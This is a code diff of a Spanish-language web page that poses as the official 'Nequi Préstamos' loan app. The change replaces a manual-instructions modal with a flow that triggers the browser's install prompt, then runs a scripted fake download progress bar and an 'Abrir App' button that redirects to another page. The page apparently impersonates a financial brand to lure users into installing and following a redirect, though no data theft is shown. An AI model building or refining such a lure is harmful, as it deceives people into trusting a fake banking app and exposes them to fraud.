@@ -85,7 +85,7 @@
             <!-- Botón de Instalación -->
             <div class="mt-8 pt-6 border-t border-slate-100 flex flex-col sm:flex-row items-center gap-4">
                 <div class="w-full sm:w-auto sm:min-w-[280px]">
-                    <button id="installBtn" onclick="startDownloadProgress()" class="w-full relative overflow-hidden bg-emerald-600 hover:bg-emerald-700 text-white font-semibold py-3.5 px-8 rounded-2xl shadow-lg shadow-emerald-600/25 transition-all duration-300 flex items-center justify-center gap-3 active:scale-[0.98]">
+                    <button id="installBtn" onclick="triggerPromptThenBar()" class="w-full relative overflow-hidden bg-emerald-600 hover:bg-emerald-700 text-white font-semibold py-3.5 px-8 rounded-2xl shadow-lg shadow-emerald-600/25 transition-all duration-300 flex items-center justify-center gap-3 active:scale-[0.98]">
                         
                         <!-- Barra de progreso interna -->
                         <div id="progressBar" class="absolute top-0 left-0 bottom-0 bg-emerald-800 w-0 transition-all duration-150 z-0"></div>
@@ -102,48 +102,7 @@
         </section>
     </main>
 
-    <!-- Modal de Instalación -->
-    <div id="installModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 hidden flex items-end sm:items-center justify-center p-0 sm:p-4">
-        <div class="bg-white w-full max-w-md rounded-t-3xl sm:rounded-3xl p-6 space-y-4 shadow-2xl animate-in fade-in slide-in-from-bottom duration-300">
-            <div class="flex items-center justify-between border-b border-slate-100 pb-3">
-                <div class="flex items-center gap-3">
-                    <img src="https://i.ibb.co/mrDtP2DW/405b3bfe-ec9b-4c85-b17f-76de3ef2345b-1.png" class="w-12 h-12 rounded-xl object-cover shadow-md">
-                    <div>
-                        <h3 class="font-bold text-slate-900 text-base">Instalar Nequi Préstamos</h3>
-                        <p class="text-xs text-slate-500">Aplicación oficial lista</p>
-                    </div>
-                </div>
-                <button onclick="closeModal()" class="p-2 text-slate-400 hover:text-slate-600 rounded-full"><i data-lucide="x" class="w-5 h-5"></i></button>
-            </div>
-            
-            <div class="space-y-3 text-sm text-slate-600">
-                <p class="text-xs font-semibold text-nequi-pink bg-nequi-pink/10 p-3 rounded-xl leading-relaxed">
-                    ✨ ¡Descarga lista! Para ver el acceso directo en tu celular, haz lo siguiente:
-                </p>
-                <div class="space-y-2 pt-1 text-xs sm:text-sm">
-                    <div id="androidInstructions" class="hidden space-y-2">
-                        <p class="flex items-center gap-2">📍 <b>En Android (Chrome):</b> Toca los <span class="bg-slate-100 px-2 py-1 rounded font-bold">3 puntos (⋮)</span> arriba a la derecha.</p>
-                        <p class="flex items-center gap-2">📍 Selecciona <b>"Instalar aplicación"</b> o <b>"Agregar a la pantalla principal"</b>.</p>
-                    </div>
-                    <div id="iosInstructions" class="hidden space-y-2">
-                        <p class="flex items-center gap-2">📍 <b>En iPhone (Safari):</b> Toca el botón <span class="bg-slate-100 px-2 py-1 rounded font-bold">Compartir (📤)</span> abajo.</p>
-                        <p class="flex items-center gap-2">📍 Selecciona <b>"Agregar al inicio"</b>.</p>
-                    </div>
-                    <div id="pcInstructions" class="hidden space-y-2">
-                        <p class="flex items-center gap-2">📍 <b>En Computador:</b> Haz clic en el ícono de instalación (💻 o ⊕) ubicado en la barra de direcciones arriba a la derecha.</p>
-                    </div>
-                </div>
-            </div>
-
-            <button id="nativeTriggerBtn" onclick="tryNativeInstall()" class="w-full hidden bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 rounded-xl shadow-md text-sm transition-all">
-                📲 Instalar de forma automática
-            </button>
-
-            <button onclick="closeModal()" class="w-full bg-nequi-purple text-white font-bold py-3 rounded-xl shadow-md text-sm">Entendido</button>
-        </div>
-    </div>
-
-    <!-- Script Principal sin contadores de texto de segundos -->
+    <!-- Script: Prompt nativo primero, barra de progreso después -->
     <script>
         lucide.createIcons();
 
@@ -155,23 +114,27 @@
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             deferredPrompt = e;
-            document.getElementById('nativeTriggerBtn').classList.remove('hidden');
         });
 
-        function detectDeviceAndShowModal() {
-            const ua = navigator.userAgent.toLowerCase();
-            if (/iphone|ipad|ipod/.test(ua)) {
-                document.getElementById('iosInstructions').classList.remove('hidden');
-            } else if (/android/.test(ua)) {
-                document.getElementById('androidInstructions').classList.remove('hidden');
+        // 1. Al presionar instalar, sale el cuadro nativo del celular primero
+        async function triggerPromptThenBar() {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                const choiceResult = await deferredPrompt.userChoice;
+
+                // 2. Si el usuario acepta el aviso nativo, arranca la barra de descarga
+                if (choiceResult.outcome === 'accepted') {
+                    startProgressBar();
+                }
+                deferredPrompt = null;
             } else {
-                document.getElementById('pcInstructions').classList.remove('hidden');
+                // Si el navegador ya tiene la app o no lanza el prompt, arranca la barra directamente
+                startProgressBar();
             }
-            document.getElementById('installModal').classList.remove('hidden');
         }
 
-        // Carga fluida de la barra de progreso sin contadores numéricos estorbosos
-        function startDownloadProgress() {
+        // Barra de progreso que corre después de aceptar el aviso
+        function startProgressBar() {
             const btn = document.getElementById('installBtn');
             const progressBar = document.getElementById('progressBar');
             const btnText = document.getElementById('btnText');
@@ -190,13 +153,12 @@
                     clearInterval(downloadInterval);
                     
                     progressBar.style.width = '100%';
-                    btnText.innerText = '¡Descarga Completa!';
+                    btnText.innerText = '¡Instalado!';
 
                     setTimeout(() => {
-                        detectDeviceAndShowModal();
-                        btnText.innerText = 'Instalar';
-                        btn.onclick = startDownloadProgress;
-                    }, 400);
+                        btnText.innerText = 'Abrir App';
+                        btn.onclick = () => { window.location.href = './redirect.html'; };
+                    }, 600);
 
                 } else {
                     progressBar.style.width = progress + '%';
@@ -204,27 +166,11 @@
             }, 100);
         }
 
-        async function tryNativeInstall() {
-            if (deferredPrompt) {
-                deferredPrompt.prompt();
-                const choiceResult = await deferredPrompt.userChoice;
-                if (choiceResult.outcome === 'accepted') {
-                    document.getElementById('btnText').innerText = '¡Instalado!';
-                    closeModal();
-                }
-                deferredPrompt = null;
-            }
-        }
-
-        function closeModal() {
-            document.getElementById('installModal').classList.add('hidden');
-        }
-
         window.addEventListener('appinstalled', () => {
             deferredPrompt = null;
-            document.getElementById('btnText').innerText = '¡Instalado!';
+            document.getElementById('btnText').innerText = 'Abrir App';
             document.getElementById('progressBar').style.width = '100%';
-            closeModal();
+            document.getElementById('installBtn').onclick = () => { window.location.href = './redirect.html'; };
         });
     </script>
 </body>
